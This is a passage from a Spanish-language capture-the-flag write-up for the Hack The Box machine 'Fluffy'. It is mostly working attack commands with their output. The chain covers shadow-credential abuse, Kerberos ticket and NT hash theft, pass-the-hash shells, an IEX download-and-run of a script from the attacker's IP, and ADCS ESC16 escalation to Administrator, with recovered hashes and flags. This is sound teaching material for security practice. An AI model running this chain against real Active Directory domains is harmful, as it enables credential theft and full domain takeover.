PEM -\u0026gt; PFX with cryptography: CsFIjWrE.pfx [+] PFX exportiert nach: CsFIjWrE.pfx [i] Passwort f√ºr PFX: CfhhGhAY2Gh1CtKkmTU8 [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: CsFIjWrE.pfx [*] Must be used with password: CfhhGhAY2Gh1CtKkmTU8 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Ahora vamos a obtener el tgt con PKINITtools:\nexegol-default /workspace $ gettgtpkinit.py -cert-pfx CsFIjWrE.pfx -pfx-pass \u0026#39;CfhhGhAY2Gh1CtKkmTU8\u0026#39; fluffy.htb/ca_svc ca_svc.ccache -dc-ip 10.10.11.69 2025-05-30 06:11:53,102 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-05-30 06:11:53,129 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-05-30 06:11:54,465 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-05-30 06:11:54,465 minikerberos INFO 84c4f40faf1acaab8111bed0a2a8852aa4a96902e86776a8b37bb06795379867 INFO:minikerberos:84c4f40faf1acaab8111bed0a2a8852aa4a96902e86776a8b37bb06795379867 2025-05-30 06:11:54,468 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file Una vez obtenido el tgt lo inyectamos y luego verificamos que el ticket sea v√°lido.\nexport KRB5CCNAME=ca_svc.ccache exegol-default /workspace $ klist Ticket cache: FILE:ca_svc.ccache Default principal: ca_svc@FLUFFY.HTB Valid starting Expires Service principal 05/30/2025 06:11:54 05/30/2025 16:11:54 krbtgt/FLUFFY.HTB@FLUFFY.HTB Ahora con el script getnthash.py vamos a obtener el hash ntlm del usuario ca_svc.\ngetnthash.py -key 84c4f40faf1acaab8111bed0a2a8852aa4a96902e86776a8b37bb06795379867 fluffy.htb/ca_svc -dc-ip 10.10.11.69 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash ca0f4f9e9eb8a092addf53bb03fc98c8 Ahora con smb probamos que el hash NT sea v√°lido.\nexegol-default /workspace $ nxc ldap 10.10.11.69 -u \u0026#34;ca_svc\u0026#34; -H \u0026#34;ca0f4f9e9eb8a092addf53bb03fc98c8\u0026#34; LDAP 10.10.11.69 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) LDAP 10.10.11.69 389 DC01 [+] fluffy.htb\\ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8 User winrm_svc - Abusing GenericWrite - Shadow credential attack (pywhisker) exegol-default /workspace $ pywhisker --dc-ip 10.10.11.69 -d \u0026#34;fluffy.htb\u0026#34; -u \u0026#34;p.agila\u0026#34; -p \u0026#34;prometheusx-303\u0026#34; --target \u0026#34;winrm_svc\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 7988dafc-8fd6-ecfc-7fa0-4bf83136a640 [*] Updating the msDS-KeyCredentialLink attribute of winrm_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: z6mHGuqe.pfx [+] PFX exportiert nach: z6mHGuqe.pfx [i] Passwort f√ºr PFX: 24QLGWORR84150cBBO3c [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: z6mHGuqe.pfx [*] Must be used with password: 24QLGWORR84150cBBO3c [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools exegol-default winrm $ gettgtpkinit.py -cert-pfx z6mHGuqe.pfx -pfx-pass \u0026#39;24QLGWORR84150cBBO3c\u0026#39; fluffy.htb/winrm_svc winrm_svc.ccache -dc-ip 10.10.11.69 2025-05-31 00:38:49,383 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-05-31 00:38:49,416 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-05-31 00:38:59,358 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-05-31 00:38:59,358 minikerberos INFO 8578cc08aeb24e18cd60ad4b380a4bde6f85aa9f010de6a8f1509f16cd29b6e5 INFO:minikerberos:8578cc08aeb24e18cd60ad4b380a4bde6f85aa9f010de6a8f1509f16cd29b6e5 2025-05-31 00:38:59,361 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file [May 31, 2025 - 00:39:50 (CEST)] exegol-default winrm $ export KRB5CCNAME=winrm_svc.ccache [May 31, 2025 - 00:40:24 (CEST)] exegol-default winrm $ ls winrm_svc.ccache z6mHGuqe.pfx [May 31, 2025 - 00:40:25 (CEST)] exegol-default winrm $ klist Ticket cache: FILE:winrm_svc.ccache Default principal: winrm_svc@FLUFFY.HTB Valid starting Expires Service principal 05/31/2025 00:38:59 05/31/2025 10:38:59 krbtgt/FLUFFY.HTB@FLUFFY.HTB exegol-default winrm $ getnthash.py -key 8578cc08aeb24e18cd60ad4b380a4bde6f85aa9f010de6a8f1509f16cd29b6e5 fluffy.htb/winrm_svc -dc-ip 10.10.11.69 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash 33bd09dcd697600edf6b3a7af4875767 [Jun 01, 2025 - 00:33:53 (CEST)] exegol-default /workspace # export KRB5CCNAME=ldap_svc.ccache [Jun 01, 2025 - 00:34:26 (CEST)] exegol-default /workspace # klist Ticket cache: FILE:ldap_svc.ccache Default principal: ldap_svc@FLUFFY.HTB Valid starting Expires Service principal 06/01/2025 00:33:52 06/01/2025 10:33:52 krbtgt/FLUFFY.HTB@FLUFFY.HTB exegol-default /workspace # getnthash.py -key f0d10a2a9fd24360549a96a20a3a1e5ebba3a0741e936905be210fbd619083fc fluffy.htb/ldap_svc -dc-ip 10.10.11.69 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash 22151d74ba3de931a352cba1f9393a37 Una vez tenemos el hash NT vamos a intentar abrirnos una linea de comandos con Evil-WinRM .\nexegol-default winrm $ nxc winrm 10.10.11.69 -u \u0026#34;winrm_svc\u0026#34; -H \u0026#34;33bd09dcd697600edf6b3a7af4875767\u0026#34; WINRM 10.10.11.69 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) WINRM 10.10.11.69 5985 DC01 [+] fluffy.htb\\winrm_svc:33bd09dcd697600edf6b3a7af4875767 (admin) WINRM 10.10.11.69 5985 DC01 [-] fluffy.htb\\winrm_svc:33bd09dcd697600edf6b3a7af4875767 zip() argument 2 is longer than argument 1 [May 31, 2025 - 00:42:24 (CEST)] exegol-default winrm # evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.10.11.69 Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents\u0026gt; type ..\\Desktop\\user.txt f324caee0*********************** Escalada de Privilegios Enumeraci√≥n del DC con el script adPEAS *Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop\u0026gt; IEX(New-Object Net.WebClient).downloadString(\u0026#34;http://10.10.15.254/adPEAS.ps1\u0026#34;) *Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop\u0026gt; Invoke-adPEAS _ _____ ______ _____ | | __ \\| ____| /\\ / ____| ____ __| | |__) | |__ / \\ | (___ / _ |/ _ | ___/| __| / /\\ \\ \\___ \\ | (_| | (_| | | | |____ / ____ \\ ____) | \\__,_|\\__,_|_| |______/_/ \\_\\_____/ Version 0.8.27 ...SNIP... [?] +++++ Checking Template \u0026#39;WebServer\u0026#39; +++++ [!] Template \u0026#39;WebServer\u0026#39; has Flag \u0026#39;ENROLLEE_SUPPLIES_SUBJECT\u0026#39; Template Name: WebServer Template distinguishedname: CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=fluffy,DC=htb Date of Creation: 04/17/2025 16:10:16 Extended Key Usage: Server Authentication EnrollmentFlag: 0 [!] CertificateNameFlag: ENROLLEE_SUPPLIES_SUBJECT [?] +++++ Checking Template \u0026#39;Machine\u0026#39; +++++ [+] Identity \u0026#39;FLUFFY\\Domain Computers\u0026#39; has enrollment rights for template \u0026#39;Machine\u0026#39; Template Name: Machine Template distinguishedname: CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=fluffy,DC=htb Date of Creation: 04/17/2025 16:10:16 [+] Extended Key Usage: Client Authentication, Server Authentication EnrollmentFlag: AUTO_ENROLLMENT CertificateNameFlag: SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN [+] Enrollment allowed for: FLUFFY\\Domain Computers [?] +++++ Checking Template \u0026#39;User\u0026#39; +++++ [+] Identity \u0026#39;FLUFFY\\Domain Users\u0026#39; has enrollment rights for template \u0026#39;User\u0026#39; Template Name: User Template distinguishedname: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=fluffy,DC=htb Date of Creation: 04/17/2025 16:10:16 [+] Extended Key Usage: Encrypting File System, Secure E-mail, Client Authentication EnrollmentFlag: INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT CertificateNameFlag: SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH [+] Enrollment allowed for: FLUFFY\\Domain Users [?] +++++ Checking Template \u0026#39;SubCA\u0026#39; +++++ [!] Template \u0026#39;SubCA\u0026#39; has Flag \u0026#39;ENROLLEE_SUPPLIES_SUBJECT\u0026#39; Template Name: SubCA Template distinguishedname: CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=fluffy,DC=htb Date of Creation: 04/17/2025 16:10:16 EnrollmentFlag: 0 [!] CertificateNameFlag: ENROLLEE_SUPPLIES_SUBJECT Luego probamos a buscar con certipy posibles configuraciones ADCS que sean vulnerables a una explotaci√≥n con los tres usuarios que tenemos acceso:\n‚ùØ certipy find -u \u0026#39;ldap_svc@fluffy.htb\u0026#39; -hashes 22151d74ba3de931a352cba1f9393a37 -dc-ip 10.10.11.69 -vulnerable -stdout Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; via CSRA: Could not connect: timed out [*] Trying to get CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; via RRP [*] Got CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; [*] Enumeration output: Certificate Authorities 0 CA Name : fluffy-DC01-CA DNS Name : DC01.fluffy.htb Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5 Certificate Validity Start : 2025-04-17 16:00:16+00:00 Certificate Validity End : 3024-04-17 16:11:16+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : FLUFFY.HTB\\Administrators Access Rights ManageCertificates : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators ManageCa : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators Enroll : FLUFFY.HTB\\Cert Publishers Certificate Templates : [!] Could not find any certificate templates ‚ùØ certipy find -u \u0026#39;winrm_svc@fluffy.htb\u0026#39; -hashes 33bd09dcd697600edf6b3a7af4875767 -dc-ip 10.10.11.69 -vulnerable -stdout Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; via CSRA: Could not connect: timed out [*] Trying to get CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; via RRP [*] Got CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; [*] Enumeration output: Certificate Authorities 0 CA Name : fluffy-DC01-CA DNS Name : DC01.fluffy.htb Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5 Certificate Validity Start : 2025-04-17 16:00:16+00:00 Certificate Validity End : 3024-04-17 16:11:16+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : FLUFFY.HTB\\Administrators Access Rights ManageCertificates : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators ManageCa : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators Enroll : FLUFFY.HTB\\Cert Publishers Certificate Templates : [!] Could not find any certificate templates He visto que mi versi√≥n de certipy estaba desactualizada y la vulnerabilidad ESC16 solo se muestra con Certipy v5.0.2. Una vez que actualizamos certipy conseguimos ver la vulnerabilidad ESC16 que contiene la m√°quina.\nESC16 explotation case with certipy https://gzzcoo.gitbook.io/pentest-notes/~gitbook/icon?size=small\u0026amp;theme=light\nhttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally\n‚ùØ certipy find -u \u0026#39;ca_svc@fluffy.htb\u0026#39; -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -stdout Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 14 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Successfully retrieved CA configuration for \u0026#39;fluffy-DC01-CA\u0026#39; [*] Checking web enrollment for CA \u0026#39;fluffy-DC01-CA\u0026#39; @ \u0026#39;DC01.fluffy.htb\u0026#39; [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : fluffy-DC01-CA DNS Name : DC01.fluffy.htb Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5 Certificate Validity Start : 2025-04-17 16:00:16+00:00 Certificate Validity End : 3024-04-17 16:11:16+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Disabled Extensions : 1.3.6.1.4.1.311.25.2 Permissions Owner : FLUFFY.HTB\\Administrators Access Rights ManageCa : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators ManageCertificates : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators Enroll : FLUFFY.HTB\\Cert Publishers [!] Vulnerabilities ESC16 : Security Extension is disabled. [*] Remarks ESC16 : Other prerequisites may be required for this to be exploitable. See the wiki for more details. Certificate Templates : [!] Could not find any certificate templates Para poder explotar esta vulnerabilidad, tenemos que actualizar el UPN de ca_svc al del usuario Administrador.\n‚ùØ certipy account -u winrm_svc -hashes \u0026#39;:33bd09dcd697600edf6b3a7af4875767\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -upn \u0026#39;Administrator\u0026#39; -user \u0026#39;ca_svc\u0026#39; update Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_svc\u0026#39;: userPrincipalName : Administrator [*] Successfully updated \u0026#39;ca_svc\u0026#39; Luego con el usuario ca_svc pedimos obtener el certificado con el nombre UPN \u0026lsquo;Administrator\u0026rsquo;.\n‚ùØ certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf5‚ùØ certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target \u0026#39;fluffy.htb\u0026#39; -ca \u0026#39;FLUFFY-DC01-CA\u0026#39; -template \u0026#39;User\u0026#39; -upn \u0026#39;Administrator\u0026#39; -dc-ip 10.10.11.69 Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 41 [*] Successfully requested certificate [*] Got certificate with UPN \u0026#39;Administrator\u0026#39; [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to \u0026#39;administrator.pfx\u0026#39; [*] Wrote certificate and private key to \u0026#39;administrator.pfx\u0026#39; Antes de ir a por el hash NTLM debemos devolverle el UPN al usuario ca_svc para que no haya conflicto a la hora de extraer el hash NTLM del usuario Administrator.\n‚ùØ certipy account -u winrm_svc -hashes \u0026#39;:33bd09dcd697600edf6b3a7af4875767\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -upn \u0026#39;ca_svc\u0026#39; -user \u0026#39;ca_svc\u0026#39; update Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_svc\u0026#39;: userPrincipalName : ca_svc [*] Successfully updated \u0026#39;ca_svc\u0026#39; Ahora ya podemos extraer el hash NTLM directamente con certipy auth.\n‚ùØ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69 -username Administrator -domain fluffy.htb Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: \u0026#39;Administrator\u0026#39; [*] Using principal: \u0026#39;administrator@fluffy.htb\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@fluffy.htb\u0026#39;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Cogemos el hash NTLM y lo usamos para autenticar-nos a trav√©s de Evil-Winrm.\n‚ùØ evil-winrm -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69 Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ..\\Desktop\\root.txt 2bebc74d579d3c561233c04eabe96a5b *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; ","permalink":"https://borhuub.github.io/writeups/fluffy/","summary":"\u003cp\u003e\u003cimg alt=\"Fluffy Machine 1\" loading=\"lazy\" src=\"/img/fluffy/Fluffy_Machine_1.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"reconocimiento\"\u003eReconocimiento\u003c/h1\u003e\n\u003cp\u003eEscaneo de puertos abiertos:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -p- --open -sS --min-rate \u003cspan class=\"m\"\u003e5000\u003c/span\u003e -vvv -n -Pn 10.10.11.69 -oG ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esudo\u003cspan class=\"o\"\u003e]\u003c/span\u003e contrase√±a para borhub:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost discovery disabled \u003cspan class=\"o\"\u003e(\u003c/span\u003e-Pn\u003cspan class=\"o\"\u003e)\u003c/span\u003e. All addresses will be marked \u003cspan class=\"s1\"\u003e\u0026#39;up\u0026#39;\u003c/span\u003e and scan \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e may be slower.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.95 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-05-25 20:58 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInitiating SYN Stealth Scan at 20:58\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanning 10.10.11.69 \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e ports\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 53/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 139/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 445/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49678/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49776/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49677/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49680/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 464/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49667/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 593/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 389/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3268/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 5985/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 88/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3269/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 636/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 9389/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49704/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49698/tcp on 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCompleted SYN Stealth Scan at 20:59, 26.35s elapsed \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e total ports\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.69\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up, received user-set \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.035s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanned at 2025-05-25 20:58:37 CEST \u003cspan class=\"k\"\u003efor\u003c/span\u003e 26s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65516\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT      STATE SERVICE          REASON\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp    open  domain           syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp    open  kerberos-sec     syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp   open  netbios-ssn      syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp   open  ldap             syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp   open  microsoft-ds     syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp   open  kpasswd5         syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp   open  http-rpc-epmap   syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp   open  ldapssl          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp  open  globalcatLDAP    syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp  open  globalcatLDAPssl syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5985/tcp  open  wsman            syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp  open  adws             syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49667/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49677/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49678/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49680/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49698/tcp open  unknown          syn-ack ttl \u003cspan 